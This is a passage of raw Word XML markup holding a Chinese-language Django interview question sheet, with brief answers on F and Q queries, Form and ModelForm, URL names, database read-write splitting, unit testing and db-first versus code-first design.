          <w:color w:val="116644"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r w:rsidRPr="004C0E9E">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>、使用</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="386EC637" w14:textId="371D5DB8" w:rsidR="00191162" w:rsidRPr="004C0E9E"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i/>
          <w:iCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004C0E9E">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:i/>
          <w:iCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>          {</w:t>
      </w:r>
      <w:r w:rsidRPr="004C0E9E">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="981A1A"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>%</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000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>plus</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116644"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>1</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116644"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>2</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116644"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>3</w:t>
      </w:r>
      <w:r w:rsidRPr="004C0E9E">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:i/>
          <w:iCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="004C0E9E">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="981A1A"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>%</w:t>
      </w:r>
      <w:r w:rsidRPr="004C0E9E">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:i/>
          <w:iCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FF59A15" w14:textId="04390193"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002</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配置实现数据库读写分离</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C250240" w14:textId="2C00E3B6" w:rsidR="00191162" w:rsidRPr="008A1DE1" w:rsidRDefault="008A1DE1" w:rsidP="008A1DE1">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>1、</w:t>
      </w:r>
      <w:r w:rsidR="00191162" w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>在配置文件中添加slave数据库配置</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62D43D4B" w14:textId="7C46A217"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创建数据库操作的路由分发类</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="034063C1" w14:textId="76B82B79" w:rsidR="00191162" w:rsidRPr="008A1DE1" w:rsidRDefault="008A1DE1" w:rsidP="008A1DE1">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>3</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00191162" w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>配置读写分离路由</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="583FA01B" w14:textId="443B1032"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b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>003</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中</w:t>
      </w:r>
      <w:r w:rsidR="00191162" w:rsidRPr="000F657C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>F</w:t>
      </w:r>
      <w:r w:rsidR="00191162" w:rsidRPr="000F657C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r w:rsidR="00191162" w:rsidRPr="000F657C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Q</w:t>
      </w:r>
      <w:r w:rsidR="00191162" w:rsidRPr="000F657C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>的作用</w:t>
      </w:r>
      <w:r w:rsidRPr="000F657C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BEE001C" w14:textId="28E937E4"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F</w:t>
      </w:r>
      <w:r w:rsidRPr="00267D1E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>查询：对数据本身的不同字段进行操作</w:t>
      </w:r>
      <w:r w:rsidRPr="00267D1E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00267D1E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>如</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比较和更新</w:t>
      </w:r>
      <w:r w:rsidR="00267D1E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1486E38D" w14:textId="1611E49F"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Q</w:t>
      </w:r>
      <w:r w:rsidRPr="00267D1E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>查询：对对象进行复杂查询，并支持</w:t>
      </w:r>
      <w:r w:rsidRPr="00267D1E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>and</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or</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not</w:t>
      </w:r>
      <w:r w:rsidRPr="00267D1E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>等操作符</w:t>
      </w:r>
      <w:r w:rsidR="00267D1E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D28542D" w14:textId="4A375143"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b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>004</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中的</w:t>
      </w:r>
      <w:r w:rsidR="00191162" w:rsidRPr="000F657C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Form</w:t>
      </w:r>
      <w:r w:rsidR="00191162" w:rsidRPr="000F657C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>组件和</w:t>
      </w:r>
      <w:r w:rsidR="00191162" w:rsidRPr="000F657C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ModelForm</w:t>
      </w:r>
      <w:r w:rsidR="00191162" w:rsidRPr="000F657C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>组件的作用</w:t>
      </w:r>
      <w:r w:rsidRPr="000F657C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F321F7B"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Form</w:t>
      </w:r>
      <w:r w:rsidRPr="00267D1E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>作用：</w:t>
      </w:r>
      <w:r w:rsidRPr="00267D1E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 1.</w:t>
      </w:r>
      <w:r w:rsidRPr="00267D1E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>在前端生成</w:t>
      </w:r>
      <w:r w:rsidRPr="00267D1E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>HTML</w:t>
      </w:r>
      <w:r w:rsidRPr="00267D1E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>代码</w:t>
      </w:r>
      <w:r w:rsidRPr="00267D1E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 2.</w:t>
      </w:r>
      <w:r w:rsidRPr="00267D1E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>对数据作有效性校验</w:t>
      </w:r>
      <w:r w:rsidRPr="00267D1E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 3.</w:t>
      </w:r>
      <w:r w:rsidRPr="00267D1E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>返回校验信息并展示</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70EEA96B" w14:textId="77777777" w:rsidR="00191162" w:rsidRPr="00267D1E" w:rsidRDefault="00191162" w:rsidP="00267D1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267D1E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>ModeForm</w:t>
      </w:r>
      <w:r w:rsidRPr="00267D1E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>：根据模型类生成</w:t>
      </w:r>
      <w:r w:rsidRPr="00267D1E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>From</w:t>
      </w:r>
      <w:r w:rsidRPr="00267D1E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>组件</w:t>
      </w:r>
      <w:r w:rsidRPr="00267D1E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r w:rsidRPr="00267D1E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>并且可以操作数据库</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EE651E7" w14:textId="62EC5671"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001</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路由系统中的</w:t>
      </w:r>
      <w:r w:rsidR="00191162" w:rsidRPr="000F657C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>name</w:t>
      </w:r>
      <w:r w:rsidR="00191162" w:rsidRPr="000F657C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>的作用</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34E0D147" w14:textId="539CA38C" w:rsidR="00191162" w:rsidRPr="008A1DE1" w:rsidRDefault="008A1DE1" w:rsidP="008A1DE1">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>1、</w:t>
      </w:r>
      <w:r w:rsidR="00191162" w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>用于反向解析路由，相当于给url取个别名，只要这个名字不变，即使对应的url改变</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FC959C6" w14:textId="6253CE2C"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通过改名字也能找到该条url</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A85D79F" w14:textId="5FAE3A54"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b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>002</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django</w:t>
      </w:r>
      <w:r w:rsidR="00191162" w:rsidRPr="000F657C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>如何实现单元测试</w:t>
      </w:r>
      <w:r w:rsidRPr="000F657C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BADCEAB" w14:textId="77777777" w:rsidR="00191162" w:rsidRPr="008A1DE1" w:rsidRDefault="00191162" w:rsidP="008A1DE1">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>django的单元测试使用python的unittest模块，这个模块使用基于类的方法来定义测试。类名为django.test</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35DE6325" w14:textId="13A1EB8C" w:rsidR="00191162" w:rsidRPr="000F657C" w:rsidRDefault="00267D1E" w:rsidP="000F657C">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="300" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="000F657C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>0</w:t>
      </w:r>
      <w:r w:rsidRPr="000F657C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>03</w:t>
      </w:r>
      <w:r w:rsidRPr="000F657C">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解释</w:t>
      </w:r>
      <w:r w:rsidR="00191162" w:rsidRPr="000F657C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>orm</w:t>
      </w:r>
      <w:r w:rsidR="00191162" w:rsidRPr="000F657C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>中</w:t>
      </w:r>
      <w:r w:rsidR="00191162" w:rsidRPr="000F657C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>db first</w:t>
      </w:r>
      <w:r w:rsidR="00191162" w:rsidRPr="000F657C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r w:rsidR="00191162" w:rsidRPr="000F657C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>code first</w:t>
      </w:r>
      <w:r w:rsidR="00191162" w:rsidRPr="000F657C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>的含义</w:t>
      </w:r>
      <w:r w:rsidRPr="000F657C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F8E40EF" w14:textId="77777777" w:rsidR="00191162" w:rsidRPr="008A1DE1" w:rsidRDefault="00191162" w:rsidP="008A1DE1">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>数据持久化的方式：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F5DD707" w14:textId="028F5E28" w:rsidR="00191162" w:rsidRPr="008A1DE1" w:rsidRDefault="00267D1E" w:rsidP="008A1DE1">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00191162" w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>db first基于已存在的数据库，生成模型</w:t>
      </w:r>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E0F2F50" w14:textId="3299C927" w:rsidR="00191162" w:rsidRPr="008A1DE1" w:rsidRDefault="00267D1E" w:rsidP="008A1DE1">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00191162" w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>code first基于已存在的模型，生成数据库</w:t>
      </w:r>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30C2B043" w14:textId="03B91BBC"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09</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接口的幂等性是什么意思？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37F0D3A8" w14:textId="3486D037" w:rsidR="00191162" w:rsidRPr="008A1DE1" w:rsidRDefault="008A1DE1" w:rsidP="008A1DE1">
